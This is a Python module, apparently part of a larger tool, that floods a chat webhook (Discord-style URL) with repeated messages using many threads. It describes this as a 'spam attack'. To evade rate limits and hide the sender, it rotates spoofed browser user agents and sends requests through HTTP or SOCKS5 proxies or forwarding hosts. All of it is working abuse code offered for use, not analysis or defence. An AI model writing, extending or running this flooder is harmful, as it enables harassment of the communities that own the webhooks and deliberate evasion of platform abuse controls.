import os 
import requests
import random
import threading
import time
import re
import json

stop_spam_flag = False
status_callback = None

def set_status_callback(callback):
    global status_callback
    status_callback = callback

def report_status(message, type_="info", progress=None):
    global status_callback
    if status_callback:
        status_callback({
            "message": message,
            "type": type_,
            "progress": progress,
            "timestamp": time.time()
        })

def proxy_loader():
    try:
        with open("data/proxies.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def ensure():
    if not os.path.exists("data"):
        os.makedirs("data")
    for filename in ["proxies.txt", "forwarder.txt"]:
        filepath = os.path.join("data", filename)
        if not os.path.exists(filepath):
            with open(filepath, "w") as f:
                pass

def Forwarder_loader():
    try:
        with open("data/forwarder.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0'
]

def send_webhook(webhook_url, content, delay=0.5, using_proxy=False, proxy_method=None):
    proxies_list = proxy_loader()
    forwarder_list = Forwarder_loader()
    proxies = None
    if proxy_method == "forwarder" and forwarder_list and using_proxy:
        forwarder = random.choice(forwarder_list)
        r = r"https?://(?:[^/]+)/api/webhooks/(\d+)/([^/]+)"
        match = re.match(r, webhook_url)
        if match:
            webhook_url = f"{forwarder}/api/webhooks/{match.group(1)}/{match.group(2)}"
    elif proxy_method == "http" and proxies_list and using_proxy:
        proxy = random.choice(proxies_list)
        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}",
        }
    elif proxy_method == "socks5" and proxies_list and using_proxy:
        proxy = random.choice(proxies_list)
        proxies = {
            "http": f"socks5://{proxy}",
            "https": f"socks5://{proxy}",
        }
    headers = {
        'User-Agent': random.choice(USER_AGENTS)
    }
    payload = {"content": content}
    try:
        response = requests.post(
            webhook_url,
            json=payload,
            proxies=proxies,
            headers=headers,
            timeout=10
        )
        time.sleep(delay)
        if response.status_code == 204:
            return True, "Message sent successfully!"
        else:
            return False, f"Failed to send message. Status Code: {response.status_code}"
    except requests.exceptions.RequestException as e:
        return False, f"Error: {e}"

def stop_spam():
    global stop_spam_flag
    stop_spam_flag = True
    report_status("Spam stopped by user.", "warning")
    return {"success": True, "message": "Spam stopped by user."}

def spam_webhook_v2(webhook_url, content, thread_count, total_messages=None, delay=0.5, proxies=False, proxy_method=None):
    global stop_spam_flag
    stop_spam_flag = False
    message_counter = 0
    success_count = 0
    fail_count = 0
    lock = threading.Lock()
    
    report_status(f"Starting spam attack with {thread_count} threads...", "info", 0)
    
    def worker(thread_id):
        nonlocal message_counter, success_count, fail_count
        while not stop_spam_flag:
            if total_messages and message_counter >= total_messages:
                break
                
            with lock:
                if total_messages and message_counter >= total_messages:
                    break
                current_count = message_counter + 1
                message_counter += 1
            success, msg = send_webhook(webhook_url, content, delay, using_proxy=proxies, proxy_method=proxy_method)
            
            with lock:
                if success:
                    success_count += 1
                else:
                    fail_count += 1
            if current_count % 5 == 0 or not success:
                progress = (current_count / total_messages * 100) if total_messages else None
                status_type = "success" if success else "error"
                report_status(
                    f"[Thread-{thread_id}] Message {current_count}: {msg}", 
                    status_type, 
                    progress
                )
    
    threads = []
    for i in range(thread_count):
        thread = threading.Thread(target=worker, args=(i+1,), name=f"Thread-{i+1}")
        thread.start()
        threads.append(thread)
    try:
        if total_messages:
            while message_counter < total_messages and not stop_spam_flag:
                time.sleep(0.1)
            stop_spam_flag = True
        else:
            last_reported = 0
            while not stop_spam_flag:
                time.sleep(1)
                if message_counter > last_reported:
                    report_status(
                        f"Progress: {message_counter} sent (✓{success_count} ✗{fail_count})", 
                        "info"
                    )
                    last_reported = message_counter
        
        for thread in threads:
            thread.join(timeout=2)
            
    except Exception as e:
        report_status(f"Error: {str(e)}", "error")
        return {"success": False, "message": str(e)}
    
    final_msg = f"Completed! Total: {message_counter} | Success: {success_count} | Failed: {fail_count}"
    report_status(final_msg, "success", 100 if total_messages else None)
    
    return {
        "success": True, 
        "message": final_msg,
        "total": message_counter,
        "success_count": success_count,
        "fail_count": fail_count
    }